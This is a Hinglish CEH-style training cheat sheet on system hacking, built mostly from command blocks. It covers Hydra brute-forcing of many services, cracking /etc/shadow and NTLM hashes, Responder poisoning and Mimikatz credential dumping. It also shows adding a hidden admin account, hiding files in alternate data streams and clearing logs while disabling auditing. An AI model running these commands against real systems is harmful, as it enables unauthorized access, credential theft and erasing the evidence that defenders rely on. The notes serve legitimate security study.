# 💻 Module 3: System Hacking

> **Passwords crack karo, access lo, escalate karo, tracks chupao!**

---

## 🔓 Password Cracking

### Hydra (Online Brute Force) — Sabse Important Tool!

```bash
# FTP Brute Force
hydra -L usernames.txt -P passwords.txt ftp://<target_ip>
hydra -l admin -P passwords.txt ftp://<target_ip>

# SSH Brute Force
hydra -L usernames.txt -P passwords.txt ssh://<target_ip>
hydra -l root -P passwords.txt ssh://<target_ip>

# RDP Brute Force
hydra -L usernames.txt -P passwords.txt rdp://<target_ip>

# SMB Brute Force
hydra -L usernames.txt -P passwords.txt smb://<target_ip>

# HTTP Form Login
hydra -l admin -P passwords.txt <target_ip> http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"

# MySQL Brute Force
hydra -l root -P passwords.txt <target_ip> mysql

# Telnet Brute Force
hydra -l admin -P passwords.txt telnet://<target_ip>
```

> 💡 **Wordlist Location (iLabs)**: `/home/attacker/Desktop/CEH_TOOLS/Wordlists/`
> Common files: `Username.txt`, `Password.txt`, `rockyou.txt`

### Hydra Flags Quick Reference
| Flag | Meaning |
|------|---------|
| `-l` | Single username |
| `-L` | Username wordlist file |
| `-p` | Single password |
| `-P` | Password wordlist file |
| `-t` | Number of threads (default 16) |
| `-V` | Verbose (show each attempt) |
| `-f` | Stop on first valid found |
| `-s` | Port number (if non-default) |

---

### John the Ripper (Offline Password Cracking)

```bash
# Crack Linux shadow file
unshadow /etc/passwd /etc/shadow > crackme.txt
john crackme.txt

# Crack with wordlist
john --wordlist=/usr/share/wordlists/rockyou.txt crackme.txt

# Show cracked passwords
john --show crackme.txt

# Crack specific hash format
john --format=raw-md5 hash.txt
john --format=raw-sha256 hash.txt
john --format=NT hash.txt
```

### Hashcat (GPU-Accelerated)

```bash
# MD5
hashcat -m 0 hash.txt wordlist.txt

# SHA-1
hashcat -m 100 hash.txt wordlist.txt

# SHA-256
hashcat -m 1400 hash.txt wordlist.txt

# NTLM (Windows)
hashcat -m 1000 hash.txt wordlist.txt

# Show cracked
hashcat -m 0 hash.txt --show
```

| Hashcat Mode (-m) | Hash Type |
|---|---|
| 0 | MD5 |
| 100 | SHA-1 |
| 1400 | SHA-256 |
| 1000 | NTLM |
| 1800 | sha512crypt (Linux) |
| 3200 | bcrypt |

---

### Hash Identification

```bash
# hash-identifier tool
hash-identifier
# Paste the hash and it will identify the type

# Online tools
# https://www.tunnelsup.com/hash-analyzer/
# https://hashes.com/en/tools/hash_identifier
```

### Common Hash Examples
| Type | Length | Example |
|------|--------|---------|
| MD5 | 32 | `5d41402abc4b2a76b9719d911017c592` |
| SHA-1 | 40 | `aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d` |
| SHA-256 | 64 | `2cf24dba5fb0a30e26e83b2ac5b9e29e...` |
| NTLM | 32 | `a4f49c406510bdcab6824ee7c30fd852` |

---

## 🔑 Windows Password Extraction

### Responder (LLMNR/NBNS Poisoning)
```bash
# Start Responder
responder -I eth0 -rdwv

# Captured hashes will be in /usr/share/responder/logs/
# Crack with john
john --wordlist=rockyou.txt captured_hash.txt
```

### Mimikatz (Windows — Run as Admin)
```
# In Command Prompt (Admin)
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords        # Dump passwords
lsadump::sam                     # Dump SAM database
lsadump::dcsync /user:admin      # DCSync attack
```

### Windows Password Hashes
```bash
# Extract hashes using pwdump/fgdump
pwdump7.exe
fgdump.exe

# samdump2
samdump2 SYSTEM SAM
```

---

## ⬆️ Privilege Escalation

### Linux Privilege Escalation
```bash
# Check current user
whoami
id

# Check sudo permissions
sudo -l

# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# Check writable directories
find / -writable -type d 2>/dev/null

# Check cron jobs
cat /etc/crontab
ls -la /etc/cron.*

# Kernel version
uname -a
cat /etc/os-release

# Search for passwords
grep -r "password" /etc/ 2>/dev/null
find / -name "*.conf" -exec grep -l "password" {} \; 2>/dev/null
```

### Windows Privilege Escalation
```cmd
:: Check current user
whoami
whoami /priv
whoami /groups

:: System info
systeminfo

:: List users
net user
net localgroup administrators

:: Add user and make admin
net user hacker Password123 /add
net localgroup administrators hacker /add

:: Check scheduled tasks
schtasks /query /fo LIST /v

:: Check running services
wmic service list brief
sc query
```

---

## 🕵️ Hiding Files & Data

### NTFS Alternate Data Streams (Windows)
```cmd
:: Hide a file inside another file
type secret.txt > readme.txt:hidden.txt

:: Read hidden stream
more < readme.txt:hidden.txt

:: Create using notepad
notepad readme.txt:hidden.txt

:: List ADS
dir /r
```

### Hide Files (Linux)
```bash
# Create hidden file (dot prefix)
mv secret.txt .secret.txt

# Show hidden files
ls -la
```

---

## 🧹 Covering Tracks

### Windows Event Logs
```cmd
:: Clear all logs (Admin CMD)
wevtutil cl System
wevtutil cl Security
wevtutil cl Application

:: Clear using PowerShell
Clear-EventLog -LogName System,Security,Application

:: Disable auditing
auditpol /set /category:* /success:disable /failure:disable
```

### Linux Logs
```bash
# Clear bash history
history -c
echo "" > ~/.bash_history

# Clear auth logs
echo "" > /var/log/auth.log
echo "" > /var/log/syslog

# Disable history
export HISTSIZE=0
unset HISTFILE
```

---

## 🖥️ Remote Access

### RDP Connection
```bash
# From Linux to Windows
rdesktop <target_ip>
xfreerdp /u:<username> /p:<password> /v:<target_ip>

# From Windows
mstsc    # Opens Remote Desktop Connection
```

### SSH Connection
```bash
ssh <user>@<target_ip>
ssh -i keyfile.pem <user>@<target_ip>
```

---

## ✅ System Hacking Quick Workflow
```
1. nmap -A <target>                     → Find open services
2. hydra -l user -P pass.txt <service>  → Brute force creds
3. Login with found credentials
4. whoami / net user                     → Check access level
5. Escalate privileges if needed
6. Extract data / complete objective
7. Cover tracks
```

